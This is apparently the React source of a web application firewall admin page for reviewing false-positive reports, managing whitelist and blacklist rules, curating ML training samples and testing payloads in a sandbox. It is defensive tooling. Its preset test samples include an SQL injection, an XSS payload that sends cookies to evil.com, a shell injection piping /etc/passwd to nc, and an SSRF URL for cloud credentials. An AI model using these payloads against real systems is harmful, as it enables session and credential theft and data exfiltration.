import { useState, useEffect } from 'react'
import { useTheme } from '../contexts/ThemeContext'
import theme from '../utils/theme'
import api from '../api/api'

export default function AttackLearning() {
  const { dark } = useTheme()
  const s = theme(dark)

  const [activeTab, setActiveTab] = useState('reports') // 'reports' | 'sandbox' | 'dataset' | 'whitelists'
  const [stats, setStats] = useState(null)
  const [loading, setLoading] = useState(true)

  // Reports state
  const [reports, setReports] = useState([])
  const [reportsFilter, setReportsFilter] = useState('all')
  const [reportsSearch, setReportsSearch] = useState('')
  const [reportsLoading, setReportsLoading] = useState(false)

  // Dataset state
  const [samples, setSamples] = useState([])
  const [samplesFilter, setSamplesFilter] = useState('all')
  const [samplesSearch, setSamplesSearch] = useState('')
  const [samplesLoading, setSamplesLoading] = useState(false)

  // Whitelists state
  const [whitelists, setWhitelists] = useState([])
  const [whitelistsLoading, setWhitelistsLoading] = useState(false)

  // Sandbox state
  const [sandboxPayload, setSandboxPayload] = useState("UNION SELECT 1, @@version, user() --")
  const [sandboxUrl, setSandboxUrl] = useState("/products?id=1")
  const [sandboxMethod, setSandboxMethod] = useState("GET")
  const [sandboxTesting, setSandboxTesting] = useState(false)
  const [sandboxResult, setSandboxResult] = useState(null)

  // Modals & Action States
  const [selectedReport, setSelectedReport] = useState(null)
  const [whitelistModalOpen, setWhitelistModalOpen] = useState(false)
  const [whitelistForm, setWhitelistForm] = useState({ name: '', pattern: '', match_type: 'contains', description: '', target_payload: '' })

  const [blacklistModalOpen, setBlacklistModalOpen] = useState(false)
  const [blacklistForm, setBlacklistForm] = useState({ name: '', pattern: '', category: 'SQL Injection', severity: 'critical', action: 'block', target_payload: '' })

  const [addSampleModalOpen, setAddSampleModalOpen] = useState(false)
  const [sampleForm, setSampleForm] = useState({ payload: '', label: 1, category: 'SQL Injection', notes: '' })

  const [retraining, setRetraining] = useState(false)
  const [notification, setNotification] = useState(null)

  const showNotification = (msg, type = 'success') => {
    setNotification({ msg, type })
    setTimeout(() => setNotification(null), 4500)
  }

  // Fetch metrics & initial tab data
  const loadStats = async () => {
    try {
      const res = await api.adminGetLearningStats()
      if (res.data) setStats(res.data)
    } catch (err) {
      console.error("Failed to load learning stats:", err)
    } finally {
      setLoading(false)
    }
  }

  const loadReports = async () => {
    setReportsLoading(true)
    try {
      const params = {}
      if (reportsFilter !== 'all') params.status = reportsFilter
      if (reportsSearch) params.q = reportsSearch
      const res = await api.adminGetLearningReports(params)
      setReports(res.data?.reports || [])
    } catch (err) {
      showNotification("Failed to fetch reports", "error")
    } finally {
      setReportsLoading(false)
    }
  }

  const loadSamples = async () => {
    setSamplesLoading(true)
    try {
      const params = {}
      if (samplesFilter !== 'all') params.label = samplesFilter
      if (samplesSearch) params.q = samplesSearch
      const res = await api.adminGetLearnedSamples(params)
      setSamples(res.data?.samples || [])
    } catch (err) {
      showNotification("Failed to fetch dataset samples", "error")
    } finally {
      setSamplesLoading(false)
    }
  }

  const loadWhitelists = async () => {
    setWhitelistsLoading(true)
    try {
      const res = await api.adminGetWhitelists()
      setWhitelists(res.data?.whitelists || [])
    } catch (err) {
      showNotification("Failed to fetch whitelists", "error")
    } finally {
      setWhitelistsLoading(false)
    }
  }

  useEffect(() => {
    loadStats()
  }, [])

  useEffect(() => {
    if (activeTab === 'reports') loadReports()
    if (activeTab === 'dataset') loadSamples()
    if (activeTab === 'whitelists') loadWhitelists()
  }, [activeTab, reportsFilter, samplesFilter])

  // ==================== ACTIONS ====================

  const handleOpenWhitelistModal = (report = null, defaultPattern = '') => {
    setSelectedReport(report)
    setWhitelistForm({
      report_id: report?.id || null,
      name: report ? `WL: ${report.reference_id}` : 'Custom Whitelist Rule',
      pattern: defaultPattern || report?.payload || report?.url || '',
      match_type: report?.payload ? 'contains' : 'url_path',
      description: report ? `Whitelisted from user report ${report.reference_id}` : '',
      target_payload: report?.payload || defaultPattern || '',
    })
    setWhitelistModalOpen(true)
  }

  const handleWhitelistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminWhitelistPattern(whitelistForm)
      showNotification("Pattern whitelisted & benign ML sample recorded successfully!")
      setWhitelistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
      if (activeTab === 'whitelists') loadWhitelists()
    } catch (err) {
      showNotification(err.message || "Failed to whitelist pattern", "error")
    }
  }

  const handleOpenBlacklistModal = (report = null, defaultPayload = '') => {
    setSelectedReport(report)
    const raw = defaultPayload || report?.payload || ''
    setBlacklistForm({
      report_id: report?.id || null,
      name: report ? `Rule: Threat ${report.reference_id}` : 'Signature: New Attack Pattern',
      pattern: raw,
      category: report?.attack_type && report.attack_type !== 'Blocked Request' ? report.attack_type : 'SQL Injection',
      severity: 'critical',
      action: 'block',
      target_payload: raw,
    })
    setBlacklistModalOpen(true)
  }

  const handleBlacklistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminBlacklistAttack(blacklistForm)
      showNotification("Attack blacklisted, rule activated globally & ML sample saved!")
      setBlacklistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Failed to blacklist attack", "error")
    }
  }

  const handleDeleteReport = async (id) => {
    if (!window.confirm("Dismiss this report?")) return
    try {
      await api.adminDeleteLearningReport(id)
      showNotification("Report dismissed")
      loadReports()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete report", "error")
    }
  }

  const handleRunSandbox = async (e) => {
    if (e) e.preventDefault()
    setSandboxTesting(true)
    try {
      const res = await api.adminTestSandbox({
        payload: sandboxPayload,
        url_path: sandboxUrl,
        method: sandboxMethod,
      })
      setSandboxResult(res.data)
    } catch (err) {
      showNotification("Sandbox evaluation failed: " + err.message, "error")
    } finally {
      setSandboxTesting(false)
    }
  }

  const handleRetrainModel = async () => {
    if (!window.confirm("Trigger incremental WAF ML model fine-tuning with all learned dataset samples?")) return
    setRetraining(true)
    try {
      const res = await api.adminRetrainWafModel()
      showNotification(res.message || `WAF ML Model updated to v${res.data?.new_version}!`)
      loadStats()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Retraining failed", "error")
    } finally {
      setRetraining(false)
    }
  }

  const handleAddSampleSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminAddLearnedSample(sampleForm)
      showNotification("Sample added to active dataset")
      setAddSampleModalOpen(false)
      setSampleForm({ payload: '', label: 1, category: 'SQL Injection', notes: '' })
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification(err.message || "Failed to add sample", "error")
    }
  }

  const handleDeleteSample = async (id) => {
    if (!window.confirm("Delete this sample from the training dataset?")) return
    try {
      await api.adminDeleteLearnedSample(id)
      showNotification("Sample removed from dataset")
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete sample", "error")
    }
  }

  const handleDeleteWhitelist = async (id) => {
    if (!window.confirm("Remove this whitelist rule?")) return
    try {
      await api.adminDeleteWhitelist(id)
      showNotification("Whitelist rule deleted")
      loadWhitelists()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete whitelist rule", "error")
    }
  }

  const sendToSandbox = (payload, url = '/') => {
    setSandboxPayload(payload)
    setSandboxUrl(url)
    setActiveTab('sandbox')
    setTimeout(() => {
      handleRunSandbox()
    }, 150)
  }

  return (
    <div style={{ padding: '28px', maxWidth: '1440px', margin: '0 auto', color: s.text }}>
      <style>{`
        .learning-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 24px; flex-wrap: wrap; gap: 16px; }
        .tabs-nav { display: flex; gap: 8px; border-bottom: 1px solid ${s.border}; padding-bottom: 12px; margin-bottom: 24px; overflow-x: auto; }
        .tab-btn { padding: 10px 20px; border-radius: 10px; font-weight: 600; font-size: 14px; cursor: pointer; transition: all 0.2s; border: none; background: transparent; color: ${s.textMuted}; display: flex; align-items: center; gap: 8px; }
        .tab-btn.active { background: ${dark ? 'rgba(239,68,68,0.15)' : 'rgba(239,68,68,0.1)'}; color: #ef4444; }
        .tab-btn:hover:not(.active) { background: ${dark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.05)'}; color: ${s.text}; }
        
        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 28px; }
        .stat-card { background: ${s.bgCard}; border: 1px solid ${s.borderLight}; border-radius: 14px; padding: 20px; position: relative; overflow: hidden; }
        .stat-val { font-size: 28px; font-weight: 800; color: ${s.text}; margin: 4px 0; }
        .stat-lbl { font-size: 13px; color: ${s.textMuted}; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }

        .report-card { background: ${s.bgCard}; border: 1px solid ${s.borderLight}; border-radius: 14px; padding: 20px; margin-bottom: 16px; transition: transform 0.15s, border-color 0.15s; }
        .report-card:hover { border-color: ${s.border}; transform: translateY(-2px); }
        .code-box { font-family: 'Fira Code', monospace; font-size: 13px; padding: 12px 16px; background: ${dark ? 'rgba(0,0,0,0.4)' : 'rgba(0,0,0,0.04)'}; border-radius: 8px; border: 1px solid ${s.borderLight}; color: ${dark ? '#38bdf8' : '#0284c7'}; word-break: break-all; margin: 10px 0; max-height: 120px; overflow-y: auto; }
        
        .badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; }
        .badge-pending { background: rgba(234,179,8,0.15); color: #eab308; }
        .badge-whitelisted { background: rgba(34,197,94,0.15); color: #22c55e; }
        .badge-blacklisted { background: rgba(239,68,68,0.15); color: #ef4444; }
        .badge-dismissed { background: rgba(148,163,184,0.15); color: #94a3b8; }
        
        .btn { padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; display: inline-flex; align-items: center; gap: 6px; }
        .btn-success { background: #16a34a; color: #fff; }
        .btn-success:hover { background: #15803d; }
        .btn-danger { background: #dc2626; color: #fff; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-primary { background: #2563eb; color: #fff; }
        .btn-primary:hover { background: #1d4ed8; }
        .btn-secondary { background: ${dark ? 'rgba(255,255,255,0.08)' : 'rgba(0,0,0,0.06)'}; color: ${s.text}; border: 1px solid ${s.border}; }
        .btn-secondary:hover { background: ${dark ? 'rgba(255,255,255,0.15)' : 'rgba(0,0,0,0.1)'}; }
        
        .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
        .modal-content { background: ${s.bgCard}; border: 1px solid ${s.border}; border-radius: 16px; padding: 28px; width: 100%; max-width: 600px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        
        .form-group { margin-bottom: 16px; }
        .form-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: ${s.textSecondary}; }
        .form-input, .form-select, .form-textarea { width: 100%; padding: 10px 14px; border-radius: 8px; border: 1px solid ${s.border}; background: ${dark ? 'rgba(0,0,0,0.3)' : 'rgba(255,255,255,0.9)'}; color: ${s.text}; font-size: 14px; box-sizing: border-box; }
        .form-input:focus, .form-select:focus, .form-textarea:focus { outline: none; border-color: #ef4444; }
      `}</style>

      {/* Floating Notification */}
      {notification && (
        <div style={{
          position: 'fixed', top: '24px', right: '24px', zIndex: 1100,
          background: notification.type === 'error' ? '#ef4444' : '#10b981',
          color: '#fff', padding: '14px 22px', borderRadius: '10px',
          boxShadow: '0 10px 25px rgba(0,0,0,0.3)', fontWeight: 600,
          display: 'flex', alignItems: 'center', gap: '10px', animation: 'slideIn 0.3s ease'
        }}>
          <i className={`fas ${notification.type === 'error' ? 'fa-triangle-exclamation' : 'fa-circle-check'}`}></i>
          {notification.msg}
        </div>
      )}

      {/* Page Header */}
      <div className="learning-header">
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{ width: '40px', height: '40px', borderRadius: '10px', background: 'linear-gradient(135deg, #ef4444, #8b5cf6)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontSize: '20px' }}>
              <i className="fas fa-brain"></i>
            </div>
            <div>
              <h1 style={{ fontSize: '26px', fontWeight: 800, margin: 0 }}>Attack Learning & Feedback Lab</h1>
              <p style={{ color: s.textSecondary, fontSize: '14px', margin: '4px 0 0 0' }}>
                Adaptive WAF training: 1-click whitelist false-positives, blacklist bypass payloads & continuously fine-tune ML models.
              </p>
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '10px' }}>
          <button className="btn btn-primary" onClick={handleRetrainModel} disabled={retraining}>
            <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i>
            {retraining ? 'Fine-Tuning WAF Model...' : 'Retrain WAF Model Now'}
          </button>
        </div>
      </div>

      {/* Top Metric Cards */}
      <div className="stat-grid">
        <div className="stat-card">
          <div className="stat-lbl">Pending False Positives</div>
          <div className="stat-val" style={{ color: '#eab308' }}>{stats?.reports?.pending || 0}</div>
          <div style={{ fontSize: '12px', color: s.textMuted }}>Total Reports: {stats?.reports?.total || 0}</div>
        </div>
        <div className="stat-card">
          <div className="stat-lbl">Learned Attack Signatures</div>
          <div className="stat-val" style={{ color: '#ef4444' }}>{stats?.rules?.learned_blocking_rules || 0}</div>
          <div style={{ fontSize: '12px', color: s.textMuted }}>Active Blacklist Rules</div>
        </div>
        <div className="stat-card">
          <div className="stat-lbl">Active Whitelists</div>
          <div className="stat-val" style={{ color: '#22c55e' }}>{stats?.rules?.active_whitelists || 0}</div>
          <div style={{ fontSize: '12px', color: s.textMuted }}>Exception Rules Enabled</div>
        </div>
        <div className="stat-card">
          <div className="stat-lbl">ML Model Version</div>
          <div className="stat-val" style={{ color: '#8b5cf6' }}>v{stats?.model_status?.model_version || '2.0.0'}</div>
          <div style={{ fontSize: '12px', color: s.textMuted }}>
            {stats?.dataset?.untrained_samples || 0} new feedback samples ready
          </div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="tabs-nav">
        <button className={`tab-btn ${activeTab === 'reports' ? 'active' : ''}`} onClick={() => setActiveTab('reports')}>
          <i className="fas fa-inbox"></i> User Reports & Feedback
          {stats?.reports?.pending > 0 && (
            <span style={{ background: '#eab308', color: '#000', padding: '2px 8px', borderRadius: '12px', fontSize: '11px', fontWeight: 800 }}>
              {stats.reports.pending}
            </span>
          )}
        </button>
        <button className={`tab-btn ${activeTab === 'sandbox' ? 'active' : ''}`} onClick={() => setActiveTab('sandbox')}>
          <i className="fas fa-flask"></i> Interactive Attack Sandbox
        </button>
        <button className={`tab-btn ${activeTab === 'dataset' ? 'active' : ''}`} onClick={() => setActiveTab('dataset')}>
          <i className="fas fa-database"></i> Active ML Dataset ({stats?.dataset?.total_samples || 0})
        </button>
        <button className={`tab-btn ${activeTab === 'whitelists' ? 'active' : ''}`} onClick={() => setActiveTab('whitelists')}>
          <i className="fas fa-shield-check"></i> Whitelist Rules ({stats?.rules?.active_whitelists || 0})
        </button>
      </div>

      {/* ==================== TAB 1: REPORTS & FEEDBACK ==================== */}
      {activeTab === 'reports' && (
        <div>
          {/* Controls Bar */}
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', gap: '16px', flexWrap: 'wrap' }}>
            <div style={{ display: 'flex', gap: '8px' }}>
              {['all', 'pending', 'whitelisted', 'blacklisted'].map(st => (
                <button
                  key={st}
                  onClick={() => setReportsFilter(st)}
                  className={`btn ${reportsFilter === st ? 'btn-primary' : 'btn-secondary'}`}
                  style={{ textTransform: 'capitalize' }}
                >
                  {st}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '10px', minWidth: '280px' }}>
              <input
                type="text"
                placeholder="Search reference, IP, URL, payload..."
                value={reportsSearch}
                onChange={e => setReportsSearch(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && loadReports()}
                className="form-input"
              />
              <button className="btn btn-secondary" onClick={loadReports}>
                <i className="fas fa-magnifying-glass"></i>
              </button>
            </div>
          </div>

          {/* Reports List */}
          {reportsLoading ? (
            <div style={{ textAlign: 'center', padding: '60px', color: s.textMuted }}>
              <i className="fas fa-circle-notch fa-spin fa-2x"></i>
              <p style={{ marginTop: '12px' }}>Loading reports...</p>
            </div>
          ) : reports.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px', background: s.bgCard, borderRadius: '16px', border: `1px dashed ${s.border}` }}>
              <i className="fas fa-check-circle fa-3x" style={{ color: '#22c55e', marginBottom: '16px' }}></i>
              <h3>No Reports Found</h3>
              <p style={{ color: s.textMuted }}>No user false positive reports matching your filter.</p>
            </div>
          ) : (
            reports.map(r => (
              <div key={r.id} className="report-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '12px' }}>
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                      <span className={`badge badge-${r.status}`}>{r.status}</span>
                      <strong style={{ fontSize: '15px' }}>REF: {r.reference_id}</strong>
                      <span style={{ fontSize: '13px', color: s.textMuted }}>Client IP: <code style={{ color: s.text }}>{r.client_ip}</code></span>
                      <span style={{ fontSize: '13px', color: s.textMuted }}>User: {r.user_email || 'Anonymous'}</span>
                    </div>
                    <div style={{ fontSize: '13px', color: s.textSecondary, marginTop: '6px' }}>
                      <strong>Target Path:</strong> <code>{r.url}</code> &bull; <strong>Triggered:</strong> <span style={{ color: '#ef4444' }}>{r.reason || r.attack_type}</span>
                    </div>
                  </div>

                  <div style={{ fontSize: '12px', color: s.textMuted }}>
                    {r.created_at?.slice(0, 19)}
                  </div>
                </div>

                {r.comments && (
                  <div style={{ marginTop: '10px', fontSize: '13px', padding: '8px 12px', background: dark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.02)', borderRadius: '6px', borderLeft: '3px solid #3b82f6' }}>
                    <strong>User Comment:</strong> {r.comments}
                  </div>
                )}

                {r.payload && (
                  <div>
                    <div style={{ fontSize: '12px', fontWeight: 700, color: s.textMuted, marginTop: '10px' }}>REPORTED BLOCKED PAYLOAD / QUERY:</div>
                    <div className="code-box">{r.payload}</div>
                  </div>
                )}

                {/* 1-Click Action Hub */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '14px', paddingTop: '14px', borderTop: `1px solid ${s.borderLight}`, flexWrap: 'wrap', gap: '10px' }}>
                  <div style={{ display: 'flex', gap: '10px' }}>
                    <button className="btn btn-success" onClick={() => handleOpenWhitelistModal(r)}>
                      <i className="fas fa-shield-check"></i> 1-Click Whitelist (Allow)
                    </button>
                    <button className="btn btn-danger" onClick={() => handleOpenBlacklistModal(r)}>
                      <i className="fas fa-ban"></i> Blacklist as Attack & Learn
                    </button>
                    <button className="btn btn-secondary" onClick={() => sendToSandbox(r.payload || r.url, r.url)}>
                      <i className="fas fa-flask"></i> Test in Sandbox
                    </button>
                  </div>

                  <button className="btn btn-secondary" style={{ color: '#ef4444' }} onClick={() => handleDeleteReport(r.id)}>
                    <i className="fas fa-trash"></i> Dismiss
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {/* ==================== TAB 2: INTERACTIVE SANDBOX ==================== */}
      {activeTab === 'sandbox' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px', alignItems: 'start' }}>
          {/* Input Form */}
          <div style={{ background: s.bgCard, borderRadius: '16px', border: `1px solid ${s.border}`, padding: '24px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <i className="fas fa-flask" style={{ color: '#ef4444', fontSize: '20px' }}></i>
              <h3 style={{ margin: 0 }}>Attack Payload Inspector</h3>
            </div>
            <p style={{ fontSize: '13px', color: s.textMuted, marginBottom: '20px' }}>
              Simulate live WAF inspection across Semantic AST, 2,000+ Regex Signatures, and ML Neural Classifier.
            </p>

            <form onSubmit={handleRunSandbox}>
              <div className="form-group">
                <label className="form-label">Request Path</label>
                <input
                  type="text"
                  value={sandboxUrl}
                  onChange={e => setSandboxUrl(e.target.value)}
                  className="form-input"
                  placeholder="/api/v1/search?q="
                />
              </div>

              <div className="form-group">
                <label className="form-label">Raw Payload / Query / Body</label>
                <textarea
                  rows={5}
                  value={sandboxPayload}
                  onChange={e => setSandboxPayload(e.target.value)}
                  className="form-textarea"
                  style={{ fontFamily: "'Fira Code', monospace" }}
                  placeholder="Enter suspicious string or SQLi/XSS/RCE/SSRF payload..."
                  required
                />
              </div>

              <div style={{ display: 'flex', gap: '10px', marginTop: '20px' }}>
                <button type="submit" className="btn btn-primary" style={{ flex: 1, padding: '12px' }} disabled={sandboxTesting}>
                  <i className={`fas fa-bolt ${sandboxTesting ? 'fa-spin' : ''}`}></i>
                  {sandboxTesting ? 'Analyzing Payload...' : 'Inspect & Analyze Payload'}
                </button>
              </div>
            </form>

            {/* Quick Preset Attack Payloads */}
            <div style={{ marginTop: '24px', paddingTop: '16px', borderTop: `1px solid ${s.borderLight}` }}>
              <div style={{ fontSize: '12px', fontWeight: 700, color: s.textMuted, marginBottom: '10px' }}>QUICK TEST SAMPLES:</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
                {[
                  { name: 'SQLi Union', p: "' UNION SELECT null, version(), user() --" },
                  { name: 'XSS DOM', p: "<img src=x onerror=fetch('http://evil.com/leak?cookie='+document.cookie)>" },
                  { name: 'RCE Shell', p: "; cat /etc/passwd | nc 10.0.0.1 4444" },
                  { name: 'SSRF Cloud', p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
                  { name: 'Benign Search', p: "search=latest+news+and+security+updates" }
                ].map(ex => (
                  <button
                    key={ex.name}
                    type="button"
                    className="btn btn-secondary"
                    style={{ fontSize: '12px' }}
                    onClick={() => { setSandboxPayload(ex.p); handleRunSandbox() }}
                  >
                    {ex.name}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Results Display */}
          <div style={{ background: s.bgCard, borderRadius: '16px', border: `1px solid ${s.border}`, padding: '24px' }}>
            <h3 style={{ margin: '0 0 16px 0' }}>Multi-Engine Telemetry</h3>

            {!sandboxResult ? (
              <div style={{ textAlign: 'center', padding: '60px 20px', color: s.textMuted }}>
                <i className="fas fa-microscope fa-3x" style={{ opacity: 0.5, marginBottom: '16px' }}></i>
                <p>Run analysis to inspect the 5-layer threat decision breakdown.</p>
              </div>
            ) : (
              <div>
                {/* Main Decision Banner */}
                <div style={{
                  padding: '16px 20px', borderRadius: '12px', marginBottom: '20px',
                  background: sandboxResult.decision === 'BLOCK' ? 'rgba(239,68,68,0.15)' : 'rgba(34,197,94,0.15)',
                  border: `1px solid ${sandboxResult.decision === 'BLOCK' ? 'rgba(239,68,68,0.3)' : 'rgba(34,197,94,0.3)'}`,
                  display: 'flex', justifyContent: 'space-between', alignItems: 'center'
                }}>
                  <div>
                    <span style={{ fontSize: '12px', fontWeight: 800, textTransform: 'uppercase', color: sandboxResult.decision === 'BLOCK' ? '#ef4444' : '#22c55e' }}>
                      DECISION: {sandboxResult.decision}
                    </span>
                    <h2 style={{ margin: '4px 0 0 0', color: s.text }}>{sandboxResult.reason}</h2>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: '28px', fontWeight: 800, color: sandboxResult.risk_score >= 70 ? '#ef4444' : sandboxResult.risk_score >= 40 ? '#eab308' : '#22c55e' }}>
                      {sandboxResult.risk_score}/100
                    </div>
                    <div style={{ fontSize: '11px', color: s.textMuted, textTransform: 'uppercase' }}>Risk Score</div>
                  </div>
                </div>

                {/* Engine Components Score Breakdown */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px', marginBottom: '20px' }}>
                  <div style={{ padding: '12px', background: dark ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.02)', borderRadius: '8px', border: `1px solid ${s.borderLight}` }}>
                    <div style={{ fontSize: '11px', color: s.textMuted }}>Semantic AST</div>
                    <div style={{ fontSize: '18px', fontWeight: 700, color: s.text }}>{sandboxResult.components?.semantic_score}%</div>
                  </div>
                  <div style={{ padding: '12px', background: dark ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.02)', borderRadius: '8px', border: `1px solid ${s.borderLight}` }}>
                    <div style={{ fontSize: '11px', color: s.textMuted }}>Regex Rules</div>
                    <div style={{ fontSize: '18px', fontWeight: 700, color: s.text }}>{sandboxResult.components?.rule_score}%</div>
                  </div>
                  <div style={{ padding: '12px', background: dark ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.02)', borderRadius: '8px', border: `1px solid ${s.borderLight}` }}>
                    <div style={{ fontSize: '11px', color: s.textMuted }}>ML Probability</div>
                    <div style={{ fontSize: '18px', fontWeight: 700, color: s.text }}>{Math.round((sandboxResult.signals?.ml_probability || 0) * 100)}%</div>
                  </div>
                </div>

                {/* Signals Details */}
                <div style={{ fontSize: '13px', marginBottom: '20px', color: s.textSecondary }}>
                  <div><strong>Threat Category:</strong> {sandboxResult.attack_type || 'None'}</div>
                  {sandboxResult.signals?.rule_matches?.length > 0 && (
                    <div style={{ marginTop: '4px' }}><strong>Matched Rules:</strong> {sandboxResult.signals.rule_matches.join(', ')}</div>
                  )}
                  {sandboxResult.whitelist_match && (
                    <div style={{ marginTop: '4px', color: '#22c55e' }}><strong>Whitelist Rule Applied:</strong> {sandboxResult.whitelist_match}</div>
                  )}
                </div>

                {/* Actions from Sandbox */}
                <div style={{ display: 'flex', gap: '10px', paddingTop: '16px', borderTop: `1px solid ${s.borderLight}` }}>
                  <button className="btn btn-success" style={{ flex: 1 }} onClick={() => handleOpenWhitelistModal(null, sandboxPayload)}>
                    <i className="fas fa-shield-check"></i> Whitelist as Safe (0)
                  </button>
                  <button className="btn btn-danger" style={{ flex: 1 }} onClick={() => handleOpenBlacklistModal(null, sandboxPayload)}>
                    <i className="fas fa-ban"></i> Blacklist & Learn Attack (1)
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================== TAB 3: ACTIVE ML DATASET & SAMPLES ==================== */}
      {activeTab === 'dataset' && (
        <div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '16px' }}>
            <div style={{ display: 'flex', gap: '8px' }}>
              {[
                { id: 'all', label: 'All Samples' },
                { id: '0', label: 'Benign Only (0)' },
                { id: '1', label: 'Attacks Only (1)' }
              ].map(f => (
                <button
                  key={f.id}
                  onClick={() => setSamplesFilter(f.id)}
                  className={`btn ${samplesFilter === f.id ? 'btn-primary' : 'btn-secondary'}`}
                >
                  {f.label}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-success" onClick={() => setAddSampleModalOpen(true)}>
                <i className="fas fa-plus"></i> Add Training Sample
              </button>
              <button className="btn btn-primary" onClick={handleRetrainModel} disabled={retraining}>
                <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i> Retrain Model
              </button>
            </div>
          </div>

          {/* Samples Table */}
          {samplesLoading ? (
            <div style={{ textAlign: 'center', padding: '60px', color: s.textMuted }}>
              <i className="fas fa-circle-notch fa-spin fa-2x"></i>
              <p style={{ marginTop: '12px' }}>Loading dataset samples...</p>
            </div>
          ) : samples.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px', background: s.bgCard, borderRadius: '16px', border: `1px dashed ${s.border}` }}>
              <h3>No Dataset Samples Found</h3>
              <p style={{ color: s.textMuted }}>Whitelist normal requests or blacklist new attacks to grow your active ML model dataset.</p>
            </div>
          ) : (
            <div style={{ background: s.bgCard, borderRadius: '16px', border: `1px solid ${s.border}`, overflow: 'hidden' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: dark ? 'rgba(0,0,0,0.3)' : 'rgba(0,0,0,0.02)', borderBottom: `1px solid ${s.border}` }}>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Label</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Category</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Payload Sample</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Source</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Status</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700, textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {samples.map(sm => (
                    <tr key={sm.id} style={{ borderBottom: `1px solid ${s.borderLight}` }}>
                      <td style={{ padding: '12px 18px' }}>
                        <span className={`badge ${sm.label === 1 ? 'badge-blacklisted' : 'badge-whitelisted'}`}>
                          {sm.label === 1 ? 'Attack (1)' : 'Benign (0)'}
                        </span>
                      </td>
                      <td style={{ padding: '12px 18px', fontWeight: 600 }}>{sm.category}</td>
                      <td style={{ padding: '12px 18px', fontFamily: "'Fira Code', monospace", maxWidth: '380px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {sm.payload}
                      </td>
                      <td style={{ padding: '12px 18px', color: s.textMuted }}>{sm.source}</td>
                      <td style={{ padding: '12px 18px' }}>
                        {sm.trained ? (
                          <span style={{ color: '#22c55e', fontSize: '12px', fontWeight: 600 }}><i className="fas fa-check"></i> Trained</span>
                        ) : (
                          <span style={{ color: '#eab308', fontSize: '12px', fontWeight: 600 }}><i className="fas fa-clock"></i> Queued</span>
                        )}
                      </td>
                      <td style={{ padding: '12px 18px', textAlign: 'right' }}>
                        <button className="btn btn-secondary" style={{ padding: '4px 8px', color: '#ef4444' }} onClick={() => handleDeleteSample(sm.id)}>
                          <i className="fas fa-trash"></i>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

